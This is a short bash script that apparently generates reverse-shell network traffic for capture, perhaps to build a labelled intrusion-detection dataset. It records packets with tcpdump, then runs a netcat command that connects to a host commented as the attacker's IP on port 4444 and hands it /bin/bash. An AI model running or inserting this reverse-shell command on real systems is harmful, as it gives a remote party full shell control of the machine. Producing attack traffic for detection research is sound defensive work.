#!/bin/bash

TARGET="205.174.165.73"  # Attacker IP in LAN B
INTERFACE="eth0"
PCAP_FILE="reverse_shell_$(date +%Y%m%d_%H%M%S).pcap"

echo "[*] Simulating reverse shell..."
tcpdump -i "$INTERFACE" host "$TARGET" and port 4444 -w "$PCAP_FILE" &
PID=$!

nc "$TARGET" 4444 -e /bin/bash || echo "[!] Shell failed, but traffic simulated."

kill "$PID"
echo "[✅] Reverse shell simulation complete: $PCAP_FILE"
